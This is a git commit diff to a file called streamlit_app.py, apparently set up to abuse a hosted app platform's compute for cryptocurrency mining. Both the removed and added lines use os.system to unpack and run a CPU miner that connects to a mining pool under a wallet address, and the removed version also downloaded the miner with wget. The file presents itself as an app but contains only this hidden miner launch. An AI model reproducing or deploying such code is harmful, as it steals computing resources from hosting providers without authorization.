c6235abacab8ad54e0eb113b6e6c7366ca06e0ef
Matthijs Stoffer <63472519+matthijs12310@users.noreply.github.com>
2021-11-07 19:15:32 +0100

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -1,2 +1,2 @@
 import os
-os.system('sudo apt-get install wget && wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.22/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a yespowersugar  -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q073wtqf6ea4sq7hqkyd85hx3ew3ryzpca854jy')
+os.system('tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a yespowersugar  -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q073wtqf6ea4sq7hqkyd85hx3ew3ryzpca854jy')
